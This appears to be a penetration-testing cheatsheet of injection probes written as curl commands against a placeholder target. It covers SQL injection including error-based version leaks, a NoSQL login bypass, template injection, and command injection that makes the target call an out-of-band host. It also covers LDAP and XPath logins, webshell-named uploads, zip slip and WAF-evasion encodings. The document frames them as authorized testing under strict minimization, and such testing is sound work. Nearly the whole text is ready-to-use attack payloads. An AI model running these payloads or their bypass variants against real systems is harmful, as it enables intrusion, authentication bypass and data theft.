# Injection Cheatsheet: SQLi, NoSQL, SSTI, command, time-differential discipline

Command set for playbook class 13. Every probe ships with its control payload in the same block; time-based claims report medians (3x runs), never anecdotes. Flat responses are honest negatives recorded as target intel.

## 1. Time-based SQLi (first, bounded, with control)

```bash
# control first (the honest baseline):
for i in 1 2 3; do curl -s -o /dev/null -w '%{time_total}\n' 'https://<TARGET>/api/v1/search?q=valid'; done
# payload (5.0s sleep; MySQL/Postgres variants):
curl -s -o /dev/null -w '%{time_total}\n' 'https://<TARGET>/api/v1/search?q=valid%27%20AND%20SLEEP(5)--%20'
curl -s -o /dev/null -w '%{time_total}\n' --data-urlencode "q=valid' AND pg_sleep(5)--" 'https://<TARGET>/api/v1/search'
# oracle/mssql forms:
curl -s -o /dev/null -w '%{time_total}\n' --data-urlencode "q=valid' AND dbms_pipe.receive_message('a',5)--" 'https://<TARGET>/api/v1/search'
```

Verdict: payload median ~5s vs control ~0.2s, repeated = the differential. Then STOP: data extraction beyond a COUNT + one masked sample stays inside minimization; deep dumping is not the job.

## 2. Boolean + error-based (second)

```bash
# boolean differential (true vs false shape comparison):
curl -s 'https://<TARGET>/api/v1/search?q=valid%27%20AND%201=1--%20' | wc -c
curl -s 'https://<TARGET>/api/v1/search?q=valid%27%20AND%201=2--%20' | wc -c
# error-based (the leak lives in the message):
curl -s 'https://<TARGET>/api/v1/search?q=%27%20AND%20EXTRACTVALUE(1%2CCONCAT(0x2e%2CVERSION()))--%20' | head -c 300
```

Consistent size/status/body differential = the oracle; capture both sides in one evidence block.

## 3. NoSQL operator injection (JSON bodies)

```bash
for body in \
  '{"email": {"$ne": ""}, "password": {"$ne": ""}}' \
  '{"email": {"$regex": "^a"}, "password": {"$gt": ""}}' \
  '{"$where": "sleep(2000)"}' \
  '{"search": {"$regex": ".*"}}'; do
  printf '%s -> ' "${body:0:40}"
  curl -s -o /dev/null -w '%{http_code} %{time_total}\n' -X POST 'https://<TARGET>/api/v1/login' \
    -H 'Content-Type: application/json' -d "$body"
done
```

`$ne` empty bypass on login = auth bypass class (playbook class 3 crossover); `$regex` char-by-char = the extraction oracle; `$where` with sleep = the time proof.

## 4. SSTI (rendered fields)

```bash
# math probes per engine family (a rendered result is the signal):
curl -s 'https://<TARGET>/profile?name={{7*7}}' | grep -o '49' | head -1
curl -s 'https://<TARGET>/profile?name=${7*7}' | grep -o '49' | head -1
curl -s 'https://<TARGET>/profile?name=<%= 7*7 %>' | grep -o '49' | head -1
# jinja2 confirmation (49 vs the raw string tells rendered vs reflected):
curl -s 'https://<TARGET>/profile?name={{7*%227%22}}' | head -c 120
```

49 in the response = template evaluation. RCE via SSTI stays at the harmless-command bar (id output, marker write, read-back, cleanup - verification.md).

## 5. Command injection (filename/path/zip params)

```bash
# the classic separators, with the canary host as the detector (OOB listener):
for sep in ';' '|' '%0a' '%26%26' '%60' '$( )'; do
  printf 'sep=%s -> ' "$sep"
  curl -s -o /dev/null -w '%{http_code}\n' 'https://<TARGET>/api/v1/export?file=report'"$sep"'curl%20http://<OOB-HOST>/BB'"$sep" | head -1
done
# blind confirmation without OOB (time):
curl -s -o /dev/null -w '%{time_total}\n' 'https://<TARGET>/api/v1/export?file=report%3Bsleep%205'
```

OOB callback landing = dispatch proof; then the harmless-command + marker round-trip on the SAME injection point (verification.md RCE ladder).

## 6. Sorting/filter parameter injection

```bash
# sort params are concat territory in decompiled DAOs; compare shapes:
for s in "price" "price;SELECT(1)" "price--" "1)UNION(SELECT(1))"; do
  printf 'sort=%s -> ' "$s"
  curl -s -o /dev/null -w '%{http_code} %{size_download}\n' "https://<TARGET>/api/v1/items?sort=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$s")"
done
```

## 7. XPath / LDAP shapes (where the stack shows them)

```bash
# LDAP (login forms on AD-backed estates):
curl -s -X POST 'https://<TARGET>/login' -d 'user=*)(&))&pass=*' -o /dev/null -w '%{http_code}\n'
curl -s -X POST 'https://<TARGET>/login' -d 'user=admin)(&&pass=x' -o /dev/null -w '%{http_code}\n'
# XPath:
curl -s 'https://<TARGET>/api/v1/lookup?user=admin%27%20or%20%271%27%3D%271' -o /dev/null -w '%{http_code} %{size_download}\n'
```

## 8. File-upload validation gaps

```bash
# extension case/content-type/MIME matrix (small harmless files only):
for f in shell.php shell.PHP shell.php.jpg shell.phtml shell.svg shell.svg%00.jpg; do
  printf '%s -> ' "$f"
  curl -s -o /dev/null -w '%{http_code}\n' -X POST 'https://<TARGET>/api/v1/avatar' \
    -F "file=@test.img;filename=$f" -H 'Authorization: Bearer <A-TOKEN>'
done
# stored-content serving context (SVG stored->XSS chain):
curl -sv 'https://<CDN>/<UPLOADED-SVG-PATH>' 2>&1 | grep -iE '< HTTP|content-type'
# path traversal in the stored name:
curl -s -o /dev/null -w '%{http_code}\n' -X POST 'https://<TARGET>/api/v1/avatar' \
  -F 'file=@test.img;filename=../../BB_probe.txt' -H 'Authorization: Bearer <A-TOKEN>'
# zip slip (extractor check, harmless marker paths inside a crafted zip):
python3 -c "import zipfile; z=zipfile.ZipFile('BB_slip.zip','w'); z.writestr('../../BB_probe.txt','<MARKER>'); z.close()"
curl -s -o /dev/null -w '%{http_code}\n' -X POST 'https://<TARGET>/api/v1/import' -F 'file=@BB_slip.zip' -H 'Authorization: Bearer <A-TOKEN>'
```

## 9. DNS/log-based second-order shapes

Second-order injection (payload stored, executed later by an internal job): plant via your own profile field, watch the OOB host and the app's rendering of your data for the executed form. Documented, never weaponized beyond the marker.

## 10. WAF-blocked variants (the honest ladder)

```bash
# case-mix, comment splits, unicode escapes (the encoder chain):
python3 - <<'EOF'
from urllib.parse import quote
base = "' AND SLEEP(5)-- "
variants = [
    base.replace(" ", "/**/"),
    base.replace("SLEEP", "sLeEp"),
    quote(base).replace("%20", "%09"),
    "'%09AND%09/**/SLEEP/**/(5)--",
]
for v in variants: print(v)
EOF
```

Blocked-by-WAF is not fixed: record the ladder attempt honestly in the finding boundary. Content-type swaps (form vs JSON vs XML same endpoint) routinely bypass naive rules.

## 11. Discipline (the rules that keep claims alive)

- Control payload in the SAME evidence block as the positive.
- Medians (3x) for every timing claim.
- One masked sample + COUNT for any data proof; scale by sampling.
- The extraction toolkit stays parked unless the class demands it; the differential IS the finding.
